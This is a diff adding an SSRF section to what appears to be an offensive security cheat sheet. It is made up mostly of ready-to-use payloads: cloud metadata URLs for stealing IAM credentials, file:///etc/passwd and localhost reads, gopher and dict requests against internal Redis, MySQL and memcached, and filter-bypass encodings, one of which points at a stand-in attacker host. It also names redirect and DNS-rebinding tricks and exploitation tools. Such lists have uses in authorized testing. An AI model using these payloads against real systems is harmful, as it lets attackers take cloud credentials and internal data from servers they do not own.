@@ -689,3 +689,42 @@ data:text/plain;base64,SSBsb3ZlIFNRRkU=
 - PDF generators
 - URL preview features
 - SSRF proxies: Burp Collaborator, Interact.sh
+
+### SSRF (Server-Side Request Forgery)
+Internal network = your playground.
+
+**Payloads (all protocols):**
+- AWS metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+- AWS user-data: `http://169.254.169.254/latest/user-data`
+- IPv4 localhost: `http://127.0.0.1:22/`, `http://localhost:22/`
+- IPv6 localhost: `http://[::ffff:127.0.0.1]:80/`, `http://[::1]`
+- File protocol: `file:///etc/passwd`
+- Gopher (for Redis/MySQL): `gopher://127.0.0.1:3306/_mysql`
+- Dict protocol: `dict://127.0.0.1:11211/stat`
+- TFTP: `tftp://127.0.0.1:69/test`
+- LDAP: `ldap://127.0.0.1:389`
+- Data URI: `data:text/html,<script>alert(1)</script>`
+
+**Cloud Metadata Endpoints:**
+- AWS: `http://169.254.169.254/latest/meta-data/`
+- Google Cloud: `http://metadata.google.internal/computeMetadata/v1/`
+- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
+- DigitalOcean: `http://169.254.169.254/metadata/v1.json`
+- Kubernetes: `https://kubernetes.default.svc/`
+
+**Advanced Techniques:**
+1. **Redirect chains**: Use your server as redirect target (302 → internal service)
+2. **DNS rebinding**: Control domain that resolves to 127.0.0.1 on second lookup
+3. **IPv6 bypasses**: Use `[::1]` or IPv6 representation of IPv4
+4. **Bypasses**:
+   - `http://127.0.0.1%00@attacker.com` (null byte injection)
+   - `http://0x7f000001` (hex)
+   - `http://2130706433` (decimal)
+   - `http://[0:0:0:0:0:ffff:127.0.0.1]` (IPv6 mapped)
+   - Use DNS wildcard pointing to internal IPs
+
+**Tools:**
+- interactsh - Collaborative SSRF testing (generate interaction URLs)
+- ssrfmap - Automated SSRF exploitation tool
+- goggles - Multi-purpose SSRF scanner
+
